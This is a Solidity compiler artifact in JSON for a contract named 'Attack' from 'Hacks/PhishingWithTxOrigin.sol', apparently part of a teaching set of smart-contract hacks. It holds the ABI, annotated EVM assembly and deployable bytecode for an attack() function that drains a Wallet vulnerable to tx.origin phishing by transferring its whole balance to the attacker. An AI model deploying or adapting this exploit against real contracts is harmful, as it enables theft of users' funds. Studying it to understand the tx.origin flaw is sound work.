{
	"Hacks/PhishingWithTxOrigin.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract Wallet",
							"name": "_wallet",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address payable",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Hacks/PhishingWithTxOrigin.sol\":1452:1743  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1532:1641  constructor(Wallet _wallet) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1587:1594  _wallet */\n  dup1\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1571:1577  wallet */\n  0x01\n  0x00\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1571:1595  wallet = Wallet(_wallet) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1622:1632  msg.sender */\n  caller\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1606:1611  owner */\n  0x00\n  0x00\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1606:1633  owner = payable(msg.sender) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1532:1641  constructor(Wallet _wallet) {... */\n  pop\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1452:1743  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:677   */\ntag_12:\n    /* \"#utility.yul\":618:625   */\n  0x00\n    /* \"#utility.yul\":647:671   */\n  tag_23\n    /* \"#utility.yul\":665:670   */\n  dup3\n    /* \"#utility.yul\":647:671   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":636:671   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:677   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":683:831   */\ntag_13:\n    /* \"#utility.yul\":769:806   */\n  tag_25\n    /* \"#utility.yul\":800:805   */\n  dup2\n    /* \"#utility.yul\":769:806   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":762:767   */\n  dup2\n    /* \"#utility.yul\":759:807   */\n  eq\n    /* \"#utility.yul\":749:825   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":821:822   */\n  0x00\n    /* \"#utility.yul\":818:819   */\n  0x00\n    /* \"#utility.yul\":811:823   */\n  revert\n    /* \"#utility.yul\":749:825   */\ntag_26:\n    /* \"#utility.yul\":683:831   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":837:1006   */\ntag_14:\n    /* \"#utility.yul\":907:912   */\n  0x00\n    /* \"#utility.yul\":938:944   */\n  dup2\n    /* \"#utility.yul\":932:945   */\n  mload\n    /* \"#utility.yul\":923:945   */\n  swap1\n  pop\n    /* \"#utility.yul\":954:1000   */\n  tag_28\n    /* \"#utility.yul\":994:999   */\n  dup2\n    /* \"#utility.yul\":954:1000   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":837:1006   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1012:1389   */\ntag_3:\n    /* \"#utility.yul\":1095:1101   */\n  0x00\n    /* \"#utility.yul\":1144:1146   */\n  0x20\n    /* \"#utility.yul\":1132:1141   */\n  dup3\n    /* \"#utility.yul\":1123:1130   */\n  dup5\n    /* \"#utility.yul\":1119:1142   */\n  sub\n    /* \"#utility.yul\":1115:1147   */\n  slt\n    /* \"#utility.yul\":1112:1231   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1150:1229   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1112:1231   */\ntag_30:\n    /* \"#utility.yul\":1270:1271   */\n  0x00\n    /* \"#utility.yul\":1295:1372   */\n  tag_32\n    /* \"#utility.yul\":1364:1371   */\n  dup5\n    /* \"#utility.yul\":1355:1361   */\n  dup3\n    /* \"#utility.yul\":1344:1353   */\n  dup6\n    /* \"#utility.yul\":1340:1362   */\n  add\n    /* \"#utility.yul\":1295:1372   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1285:1372   */\n  swap2\n  pop\n    /* \"#utility.yul\":1241:1382   */\n  pop\n    /* \"#utility.yul\":1012:1389   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"Hacks/PhishingWithTxOrigin.sol\":1452:1743  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1452:1743  contract Attack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1475:1503  address payable public owner */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1649:1740  function attack() public {... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1475:1503  address payable public owner */\n    tag_6:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1649:1740  function attack() public {... */\n    tag_10:\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1685:1691  wallet */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1685:1700  wallet.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa9059cbb\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1701:1706  owner */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1716:1722  wallet */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1708:1731  address(wallet).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1685:1732  wallet.transfer(owner, address(wallet).balance) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap3\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      revert(0x00, 0x00)\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n        /* \"Hacks/PhishingWithTxOrigin.sol\":1649:1740  function attack() public {... */\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_17:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:243   */\n    tag_18:\n        /* \"#utility.yul\":184:191   */\n      0x00\n        /* \"#utility.yul\":213:237   */\n      tag_25\n        /* \"#utility.yul\":231:236   */\n      dup3\n        /* \"#utility.yul\":213:237   */\n      tag_17\n      jump\t// in\n    tag_25:\n        /* \"#utility.yul\":202:237   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:243   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":249:391   */\n    tag_19:\n        /* \"#utility.yul\":352:384   */\n      tag_27\n        /* \"#utility.yul\":378:383   */\n      dup2\n        /* \"#utility.yul\":352:384   */\n      tag_18\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":347:350   */\n      dup3\n        /* \"#utility.yul\":340:385   */\n      mstore\n        /* \"#utility.yul\":249:391   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":397:651   */\n    tag_8:\n        /* \"#utility.yul\":506:510   */\n      0x00\n        /* \"#utility.yul\":544:546   */\n      0x20\n        /* \"#utility.yul\":533:542   */\n      dup3\n        /* \"#utility.yul\":529:547   */\n      add\n        /* \"#utility.yul\":521:547   */\n      swap1\n      pop\n        /* \"#utility.yul\":557:644   */\n      tag_29\n        /* \"#utility.yul\":641:642   */\n      0x00\n        /* \"#utility.yul\":630:639   */\n      dup4\n        /* \"#utility.yul\":626:643   */\n      add\n        /* \"#utility.yul\":617:623   */\n      dup5\n        /* \"#utility.yul\":557:644   */\n      tag_19\n      jump\t// in\n    tag_29:\n        /* \"#utility.yul\":397:651   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":657:734   */\n    tag_20:\n        /* \"#utility.yul\":694:701   */\n      0x00\n        /* \"#utility.yul\":723:728   */\n      dup2\n        /* \"#utility.yul\":712:728   */\n      swap1\n      pop\n        /* \"#utility.yul\":657:734   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":740:858   */\n    tag_21:\n        /* \"#utility.yul\":827:851   */\n      tag_32\n        /* \"#utility.yul\":845:850   */\n      dup2\n        /* \"#utility.yul\":827:851   */\n      tag_20\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":822:825   */\n      dup3\n        /* \"#utility.yul\":815:852   */\n      mstore\n        /* \"#utility.yul\":740:858   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":864:1228   */\n    tag_13:\n        /* \"#utility.yul\":1001:1005   */\n      0x00\n        /* \"#utility.yul\":1039:1041   */\n      0x40\n        /* \"#utility.yul\":1028:1037   */\n      dup3\n        /* \"#utility.yul\":1024:1042   */\n      add\n        /* \"#utility.yul\":1016:1042   */\n      swap1\n      pop\n        /* \"#utility.yul\":1052:1139   */\n      tag_34\n        /* \"#utility.yul\":1136:1137   */\n      0x00\n        /* \"#utility.yul\":1125:1134   */\n      dup4\n        /* \"#utility.yul\":1121:1138   */\n      add\n        /* \"#utility.yul\":1112:1118   */\n      dup6\n        /* \"#utility.yul\":1052:1139   */\n      tag_19\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":1149:1221   */\n      tag_35\n        /* \"#utility.yul\":1217:1219   */\n      0x20\n        /* \"#utility.yul\":1206:1215   */\n      dup4\n        /* \"#utility.yul\":1202:1220   */\n      add\n        /* \"#utility.yul\":1193:1199   */\n      dup5\n        /* \"#utility.yul\":1149:1221   */\n      tag_21\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":864:1228   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c8bb6d64345f997964ddd86c3ef478a964d2e189992ccb3e042ec8f60648b8c164736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b5060405161039138038061039183398181016040528101906100319190610125565b8060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550335f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610150565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b5f6100f4826100d9565b9050919050565b610104816100ea565b811461010e575f5ffd5b50565b5f8151905061011f816100fb565b92915050565b5f6020828403121561013a576101396100b6565b5b5f61014784828501610111565b91505092915050565b6102348061015d5f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80638da5cb5b146100385780639e5faafc14610056575b5f5ffd5b610040610060565b60405161004d91906101a6565b60405180910390f35b61005e610084565b005b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b81526004016101389291906101d7565b5f604051808303815f87803b15801561014f575f5ffd5b505af1158015610161573d5f5f3e3d5ffd5b50505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61019082610167565b9050919050565b6101a081610186565b82525050565b5f6020820190506101b95f830184610197565b92915050565b5f819050919050565b6101d1816101bf565b82525050565b5f6040820190506101ea5f830185610197565b6101f760208301846101c8565b939250505056fea2646970667358221220c8bb6d64345f997964ddd86c3ef478a964d2e189992ccb3e042ec8f60648b8c164736f6c634300081c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x391 CODESIZE SUB DUP1 PUSH2 0x391 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x125 JUMP JUMPDEST DUP1 PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x150 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE3 DUP3 PUSH2 0xBA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xF4 DUP3 PUSH2 0xD9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x104 DUP2 PUSH2 0xEA JUMP JUMPDEST DUP2 EQ PUSH2 0x10E JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x11F DUP2 PUSH2 0xFB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x13A JUMPI PUSH2 0x139 PUSH2 0xB6 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x147 DUP5 DUP3 DUP6 ADD PUSH2 0x111 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x234 DUP1 PUSH2 0x15D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x56 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x60 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x1A6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x5E PUSH2 0x84 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x138 SWAP3 SWAP2 SWAP1 PUSH2 0x1D7 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x161 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x190 DUP3 PUSH2 0x167 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1A0 DUP2 PUSH2 0x186 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B9 PUSH0 DUP4 ADD DUP5 PUSH2 0x197 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1D1 DUP2 PUSH2 0x1BF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x1EA PUSH0 DUP4 ADD DUP6 PUSH2 0x197 JUMP JUMPDEST PUSH2 0x1F7 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x1C8 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC8 0xBB PUSH14 0x64345F997964DDD86C3EF478A964 0xD2 0xE1 DUP10 SWAP10 0x2C 0xCB RETURNDATACOPY DIV 0x2E 0xC8 0xF6 MOD BASEFEE 0xB8 0xC1 PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "112800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"owner()": "2485"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"owner()": "8da5cb5b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 45,
						"contract": "Hacks/PhishingWithTxOrigin.sol:Attack",
						"label": "owner",
						"offset": 0,
						"slot": "0",
						"type": "t_address_payable"
					},
					{
						"astId": 48,
						"contract": "Hacks/PhishingWithTxOrigin.sol:Attack",
						"label": "wallet",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(Wallet)43"
					}
				],
				"types": {
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_contract(Wallet)43": {
						"encoding": "inplace",
						"label": "contract Wallet",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}